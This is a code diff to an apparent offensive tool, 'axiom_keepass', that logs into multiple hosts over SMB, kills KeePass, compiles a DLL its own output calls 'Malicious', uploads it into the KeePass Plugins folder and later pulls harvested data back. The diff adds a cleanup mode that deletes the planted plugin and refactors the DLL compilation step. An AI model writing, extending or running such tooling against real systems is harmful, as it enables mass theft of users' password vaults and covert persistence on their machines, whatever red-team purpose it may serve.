@@ -11,7 +11,9 @@ from axiom_keepass.client.login import login
 from axiom_keepass.client.download import download
 from axiom_keepass.client.upload import upload
 from axiom_keepass.client.pull import pull
+from axiom_keepass.client.delete import delete
 from axiom_keepass.utils.kill_process import kill_process
+from axiom_keepass.core.compile import compile_dll
 
 class ThreadWorker(threading.Thread):
     def __init__(self, args, thread_index, thread_count, target_list, target_count):
@@ -42,8 +44,15 @@ class ThreadWorker(threading.Thread):
                     current_index += self.thread_count
                     continue
 
-                if AxiomArgParser.GetProgramArgs().pull == True or AxiomArgParser.GetProgramArgs().monitor == True: # type: ignore
+                if AxiomArgParser.GetProgramArgs().mode == "pull": # type: ignore
                     pull(smbClient, self.thread_index)
+                    current_index += self.thread_count
+                    continue
+                elif AxiomArgParser.GetProgramArgs().mode == "cleanup": # type: ignore
+                    if AxiomArgParser.GetProgramArgs().kill_first is True: # type: ignore
+                        kill_process(smbClient, self.thread_index, "KeePass.exe")
+                        time.sleep(1)
+                    delete(smbClient, self.thread_index, r"\Program File\KeePass Password Safe 2\Plugins\AxiomKeepass.dll")
                     current_index += self.thread_count
                     continue
 
@@ -61,16 +70,7 @@ class ThreadWorker(threading.Thread):
                     kill_process(smbClient, self.thread_index, 'KeePass.exe')
                     time.sleep(1)
 
-                subprocess.run([
-                    "mcs",
-                    "-platform:x64",
-                    f"-out:{tmp_dir}/AxiomKeepass.dll",
-                    f"-r:{tmp_dir}/KeePass.exe",
-                    f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Windows.Forms.dll",
-                    "-target:library",
-                    f"{os.path.dirname(__file__)}/../../Assembly/AxiomKeepass.cs",
-                    f"{os.path.dirname(__file__)}/../../Assembly/AssemblyInfo.cs"
-                ])
+                compile_dll(smbClient, tmp_dir, self.thread_index)
                 print(f"[THREAD {self.thread_index}][+] Malicious DLL compiled for {self.target_list[current_index]}")
 
                 upload(
@@ -83,7 +83,7 @@ class ThreadWorker(threading.Thread):
                 smbClient.close()
                 current_index += self.thread_count
             print(f"[THREAD {self.thread_index}][+] All targets processed")
-            if AxiomArgParser.GetProgramArgs().monitor != True: # type: ignore
+            if AxiomArgParser.GetProgramArgs().mode != "pull" or AxiomArgParser.GetProgramArgs().monitor != True: # type: ignore
                 break
             time.sleep(AxiomArgParser().GetProgramArgs().monitor_delay) #type: ignore
 
